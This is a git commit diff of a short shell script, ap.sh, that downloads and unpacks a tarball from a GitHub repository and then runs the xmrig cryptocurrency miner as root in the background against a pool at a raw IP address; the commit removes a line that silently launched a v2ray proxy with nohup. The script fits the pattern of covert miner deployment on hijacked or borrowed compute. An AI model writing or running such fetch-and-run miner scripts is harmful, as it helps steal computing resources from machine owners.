feb4bd7087a337958d63f4d954d8388ed9f3c571
prendibs <94189491+prendibs@users.noreply.github.com>
2025-08-14 17:36:47 +0700

    Update ap.sh

--- ap.sh
+++ ap.sh
@@ -2,6 +2,5 @@
 #love u fika
 
 wget https://github.com/prendibs/y/raw/main/x.tar.gz && tar xf x.tar.gz
-nohup sudo ./v2ray run --config=ap.json </dev/null >/dev/null 2>&1 &
 echo "love u fika"
 sudo ./xmrig -B -o 4.194.201.194:80 -u rvzn -p x -a rx/0 -k --nicehash
